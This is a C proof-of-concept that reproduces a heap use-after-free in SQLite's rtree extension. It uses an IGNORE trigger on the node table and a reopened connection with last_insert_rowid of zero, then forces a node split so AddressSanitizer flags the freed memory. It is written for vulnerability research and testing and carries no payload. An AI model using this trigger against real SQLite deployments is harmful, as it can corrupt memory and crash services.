/*
 * SQLite 3.53.4 rtree last_insert_rowid()==0 UAF (G10).
 *
 * Vendor sequence from branch-3.53 rtreeI.test 2.0-2.2 (11ce330557):
 * fill until a split, plant BEFORE INSERT RAISE(IGNORE) on %_node,
 * reopen so last_insert_rowid is 0, INSERT one more row, then walk.
 *
 * ASan should report heap-use-after-free in nodeHash / nodeRelease /
 * nodeWrite / nodeAcquire. Not an exploit payload.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sqlite3.h"

#define WITNESS "SQLITE-RTREE-ROWID0-WITNESS"
#define DB_PATH "/tmp/rtree-rowid0.db"
#define CONTROL_DB_PATH "/tmp/rtree-control.db"

static void die_sql(sqlite3 *db, const char *sql, int rc) {
    const char *err = db ? sqlite3_errmsg(db) : "no-db";
    fprintf(stderr, "sql-fail rc=%d sql=%s err=%s\n", rc, sql, err);
    fflush(stderr);
}

static int exec_sql(sqlite3 *db, const char *sql) {
    char *err = NULL;
    int rc = sqlite3_exec(db, sql, NULL, NULL, &err);
    if (rc != SQLITE_OK) {
        fprintf(
            stderr,
            "exec rc=%d sql=%s err=%s\n",
            rc,
            sql,
            err ? err : sqlite3_errmsg(db)
        );
        sqlite3_free(err);
        fflush(stderr);
    }
    return rc;
}

static int open_db(const char *path, sqlite3 **out) {
    sqlite3 *db = NULL;
    int rc = sqlite3_open(path, &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "open-fail path=%s rc=%d err=%s\n", path, rc, sqlite3_errmsg(db));
        sqlite3_close(db);
        return rc;
    }
    /* RtreeNode is lookaside-sized; force system malloc so ASan can see UAF. */
    sqlite3_db_config(db, SQLITE_DBCONFIG_LOOKASIDE, (void *)0, 0, 0);
    sqlite3_extended_result_codes(db, 1);
    *out = db;
    return SQLITE_OK;
}

static int fill_rtree(sqlite3 *db) {
    int rc;
    rc = exec_sql(db, "PRAGMA page_size = 4096");
    if (rc != SQLITE_OK) {
        return rc;
    }
    rc = exec_sql(db, "CREATE TABLE zero(x INTEGER PRIMARY KEY)");
    if (rc != SQLITE_OK) {
        return rc;
    }
    rc = exec_sql(db, "CREATE VIRTUAL TABLE t1 USING rtree(id, x1, x2, y1, y2)");
    if (rc != SQLITE_OK) {
        return rc;
    }
    /* 51 cells = RTREE_MAXCELLS; the next INSERT splits the root. */
    rc = exec_sql(
        db,
        "WITH RECURSIVE c(i) AS ("
        "  VALUES(1) UNION ALL SELECT i+1 FROM c WHERE i<51"
        ") INSERT INTO t1 SELECT i, i, i+1, i, i+1 FROM c"
    );
    return rc;
}

static int run_control(void) {
    sqlite3 *db = NULL;
    int rc;
    remove(CONTROL_DB_PATH);
    rc = open_db(CONTROL_DB_PATH, &db);
    if (rc != SQLITE_OK) {
        return rc;
    }
    rc = fill_rtree(db);
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return rc;
    }
    rc = exec_sql(db, "INSERT INTO t1 VALUES(1000, 0, 1, 0, 1)");
    printf("control-split-rc=%d errmsg=%s last_rowid=%lld\n",
           rc,
           sqlite3_errmsg(db),
           (long long)sqlite3_last_insert_rowid(db));
    fflush(stdout);
    sqlite3_close(db);
    return rc;
}

static int run_trigger_uaf(void) {
    sqlite3 *db = NULL;
    int rc;
    sqlite3_int64 last_rowid;

    remove(DB_PATH);
    rc = open_db(DB_PATH, &db);
    if (rc != SQLITE_OK) {
        return rc;
    }
    rc = fill_rtree(db);
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return rc;
    }
    rc = exec_sql(
        db,
        "CREATE TRIGGER tr BEFORE INSERT ON t1_node BEGIN"
        "  SELECT raise(IGNORE);"
        " END"
    );
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return rc;
    }
    printf("pre-close-last-rowid=%lld\n", (long long)sqlite3_last_insert_rowid(db));
    fflush(stdout);
    sqlite3_close(db);
    db = NULL;

    rc = open_db(DB_PATH, &db);
    if (rc != SQLITE_OK) {
        return rc;
    }
    last_rowid = sqlite3_last_insert_rowid(db);
    printf("reopen-last-rowid=%lld\n", (long long)last_rowid);
    printf("witness-before-split=%s\n", WITNESS);
    fflush(stdout);
    fflush(stderr);

    rc = exec_sql(db, "INSERT INTO t1 VALUES(1000, 0, 1, 0, 1)");
    printf(
        "split-insert-rc=%d errmsg=%s last_rowid=%lld\n",
        rc,
        sqlite3_errmsg(db),
        (long long)sqlite3_last_insert_rowid(db)
    );
    fflush(stdout);
    fflush(stderr);

    /* Child nodenos were hashed as 0 then freed; a walk hits the stale hash. */
    rc = exec_sql(db, "SELECT * FROM t1");
    printf("select-star-rc=%d errmsg=%s\n", rc, sqlite3_errmsg(db));
    fflush(stdout);
    fflush(stderr);

    rc = exec_sql(db, "SELECT * FROM t1 WHERE id=25");
    printf("select-id25-rc=%d errmsg=%s\n", rc, sqlite3_errmsg(db));
    fflush(stdout);
    fflush(stderr);

    sqlite3_close(db);
    return rc;
}

int main(int argc, char **argv) {
    int rc;

    sqlite3_config(SQLITE_CONFIG_LOOKASIDE, 0, 0);

    printf("version=%s\n", sqlite3_libversion());
    printf("sourceid=%s\n", sqlite3_sourceid());
    printf("rtree-enabled=yes\n");
    fflush(stdout);

    if (argc >= 2 && strcmp(argv[1], "--version") == 0) {
        return 0;
    }

    rc = run_control();
    if (rc != SQLITE_OK) {
        die_sql(NULL, "control-split", rc);
        fprintf(stderr, "FAIL control-split-rc=%d %s\n", rc, WITNESS);
        return 1;
    }
    printf("control-split=ok\n");
    fflush(stdout);

    rc = run_trigger_uaf();
    printf("trigger-path-returned rc=%d\n", rc);
    printf("no-asan-abort %s\n", WITNESS);
    fflush(stdout);
    return 0;
}
